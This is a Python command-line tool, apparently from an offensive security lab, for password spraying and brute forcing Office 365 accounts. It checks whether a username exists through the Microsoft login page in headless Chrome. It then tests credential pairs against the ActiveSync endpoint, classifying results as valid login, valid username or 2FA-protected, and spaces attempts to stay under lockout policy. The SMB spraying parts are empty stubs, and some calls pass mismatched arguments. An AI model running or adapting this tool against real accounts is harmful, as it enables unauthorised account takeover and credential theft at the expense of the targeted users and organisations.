#!/usr/bin/env python3
import platform
import os
import socket
import time
from datetime import datetime
from argparse import ArgumentParser
from threading import Thread
import requests
import os
import sys
import platform
from colorama import init, Fore
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import io

init()

def switch():
    parser = ArgumentParser()
    parser.add_argument('-m','--mode', help='bruteforce mode to use [o365|smb|other]', required=False,)
    parser.add_argument('-u','--username', help='username to test [cannot be used with -uf or --userfile]', required=False)
    parser.add_argument('-p','--password', help='password to test [cannot be used with -pf or --passfile]', required=False)
    parser.add_argument('-uf','--userfile', help='list of usernames to test [cannot be used with -u or --username]', required=False)
    parser.add_argument('-pf','--passfile', help='list of password to test [cannot be used with -p or --password]', required=False)
    parser.add_argument('-policy','--policy', help='password policy to be applied [attempts,minutes]', required=False)
    parser.add_argument('-v','--verbose', help='read output to terminal',required=False, action='store_true')
    return parser.parse_args()

def cls():
    os_env = platform.platform()
    if 'Windows' in os_env:
        os.system('cls')
    else:
        os.system('clear')

def banner():
    banner = """
                                                            
                                     .*..,                  
                                   ,#*/#(%#.                
                                  ,%#%%#%%#                 
                                .*###@&#/                   
                ...  ..,,,,,,,*/,**#&&(*,. .,.              
            .  ,/**/*/*(*/(#(,,**%%&#&#*****,.  ,           
           .  (&%#####%%(&(,,*/#%%#&%#,**/*//(*  *          
           #*.  ,%@&@@@@#/(/(%%&#%&#&(/((#/.   **,          
           #(***,.,.                    ,*/#(///*           
           *#//***,,,.,.,,,***//((((((%%%%###//*/           
            #**/,.,,,,.......,***(####((#((#(/**            
             #(/*,,,.,.,,,.,,,,**/((##(##(#((**,            
              #(**.*,,,,,,*,,,/((((//(##(#(/**,             
               ((*,,..,....,,,*//((##%%####/*.              
                .(//,**,..**//((##((#%&%#(/*                
                   #/#(*(##(((//#%@@%%##(/                  
                    &%%%#%%%%&@@&@@&&%((*                   
                  .(/*,,,..,,**/**((((##/,                  
                  %/,,,..,.,...,*(#%#%(#(/.                 
                    (#(/***/*//(((#####%*                   
                          ,/(((//,                                         

                        from nsfLabs
"""
    print(banner)
        
    
def brute_office(username,password):
    try:
        print(Fore.YELLOW+"Checking credentials {0}:{1}".format(username, password))
        check_user = check_o365(username)
        if(check_user == None):
            print(Fore.RED+"[+] Error! Target does not seem to be using Office365")
        elif (check_user == True):
            #TODO: run bruter
            header = {"MS-ASProtocolVersion": "14.0"
                }
            LOGIN_URL = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
            STATUS_CODES = {"200": "VALID USERPASS",
                            "401": "VALID USERNAME ONLY",
                            "403": "VALID USERPASS WITH 2FA",
                            "404": "INVALID USERNAME"
                        }
            r = requests.options(LOGIN_URL, headers=header, auth=(username,password), timeout=300)

            color = Fore.GREEN+"Login Found: " if r.status_code == 200 else Fore.RED+"Invalid Login: "
            print(color+"{}:{} - {}".format(username,password,STATUS_CODES[str(r.status_code)]))

        elif(check_user == False):
            print(Fore.RED+"[+] Error! Invalid username")  
        else:
            print(Fore.RED+"[+] Error! Unknown Error")
            sys.exit(0)
    
    except KeyboardInterrupt:
        print("[!] Detected Ctrl + C. Shutting down...")
        sys.exit(0)
        


def sprayAD(host):
    # TODO: run AD spray here
    pass

def check_o365(username):
    
    domain = username.split('@')[1].replace('.', '-')
    url_dict = {
        "Global Office365": ".mail.protection.outlook.com",
        "other convention for Office365": ".mail.protection." + username
    }
    for line in url_dict:
        try:
            socket.gethostbyname(domain + url_dict[line])
            options = Options()
            options.add_argument("--headless")
            driver = webdriver.Chrome(options=options)
            driver.get("https://login.microsoftonline.com")
            element = driver.find_element_by_name("loginfmt")
            element.send_keys(username)
            element.send_keys(Keys.RETURN)
            time.sleep(1)
            try:
                driver.find_element_by_id("usernameError")
                return False
            except:
                return True
        except Exception as e:
            print(e)
 

def hybrid_office_worker(policy,user,_pass):
    attempts = 1
    max_attempts, timelimit = tuple(policy.split(','))
    timelimit = 60*int(timelimit)
    max_attempts = int(max_attempts) - 1
    
    if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
        #this shows we are spraying a single username against a passfile
        try:
            for password in _pass.readlines():
                #This is where we will apply our password policy
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                brute_office(user,password.strip("\n"))
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
                     
    elif isinstance(_pass, str) and isinstance(user, io.TextIOWrapper):
        #this shows we are spraying a single password against a userfile
        try:
            for username in user.readlines():
                #This is where we will apply our password policy
                if attempts == max_attempts:
                    sleep(timelimit)
                    attempts = 1
                brute_office(username.strip("\n"),_pass)
                attempts = attempts + 1
                sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
            
    elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
        #this means we are spraying userfile against passfile.
        try: 
            for password in _pass.readlines():
                for username in user.readlines():
                    if attempts == max_attempts:
                        sleep(timelimit)
                        attempts = 1
                    brute_office(username.strip("\n"),password.strip("\n"))
                    attempts = attempts + 1
                    sleep(timelimit//max_attempts)
        except Exception as e:
            print(e)
            exit(0)
            
    else:
        print("[!]Unknown input. Check the usage")

def hybrid_smb_worker(policy,username="",password="",userfile="",passfile=""):
    #TODO: Run hybrid bruteforcing here using worker threads
    pass


if __name__ == '__main__':
    cls()
    banner()

    options = switch()

    mode = options.mode
    username = options.username
    password = options.password
    userfile = options.userfile
    passfile = options.passfile
    policy = options.policy
    verbose = options.verbose
    
    if username and userfile:
        ArgumentParser().print_usage()
        sys.exit(0)
    if password and passfile:
        ArgumentParser().print_usage()
        sys.exit(0)
    
    
    if username and password:
        single_test = True
    else:
        single_test = False

    # Run o365 bruteforce test
    if mode == "o365":
        print(Fore.BLUE+"Starting Office 365 Password Spraying/Bruteforce")
        if single_test:
            brute_office(username,password)
        else:
            if username and passfile:
                passfile = open(passfile,'r')
                hybrid_office_worker(policy,username,passfile)
            elif userfile and password:
                userfile = open(userfile,'r')
                hybrid_office_worker(policy,userfile,password)
            elif userfile and passfile:
                passfile = open(passfile,'r')
                userfile = open(userfile,'r')
                hybrid_office_worker(policy,userfile,passfile)
            else:
                print("[+]Unknow error! Check usage")

    # Run smb spraying test   
    if mode == "smb":
        if single_test:
            sprayAD(username,password)
        else:
            hybrid_smb_worker(username,password,userfile,passfile,policy)
